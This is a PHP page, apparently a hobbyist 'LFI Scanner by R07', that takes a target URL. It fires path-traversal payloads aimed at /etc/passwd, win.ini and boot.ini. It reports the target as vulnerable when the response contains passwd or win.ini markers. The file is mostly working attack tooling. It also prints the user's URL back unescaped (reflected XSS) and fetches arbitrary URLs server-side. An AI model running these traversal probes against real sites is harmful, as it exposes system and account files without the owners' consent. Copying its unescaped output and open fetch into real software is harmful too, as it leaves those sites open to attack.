<?php
// LFI Scanner by R07 🛡️
$paths = [
  "../../../../etc/passwd",
  "../../etc/passwd",
  "/etc/passwd",
  "../../../../windows/win.ini",
  "../../boot.ini"
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $target = trim($_POST['url']);
  $result = "<ul>";
  foreach ($paths as $path) {
    $url = $target . urlencode($path);
    $resp = @file_get_contents($url);
    if ($resp && (strpos($resp, "root:") !== false || strpos($resp, "[extensions]") !== false)) {
      $result .= "<li><b style='color:red'>VULN:</b> <code>$url</code></li>";
    } else {
      $result .= "<li><code>$url</code> ✅</li>";
    }
  }
  $result .= "</ul>";
} else {
  $result = '';
}
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>LFI Scanner</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head><body class="bg-dark text-light">
<div class="container py-5">
  <div class="card bg-secondary text-light shadow">
    <div class="card-body">
      <h4 class="card-title">🗂️ LFI Scanner</h4>
      <form method="post" class="mb-3">
        <div class="input-group">
          <input type="text" name="url" class="form-control" placeholder="http://target.com/page.php?file=" required>
          <button class="btn btn-warning">Scan</button>
        </div>
      </form>
      <?= $result ?>
    </div>
  </div>
</div>
</body></html>
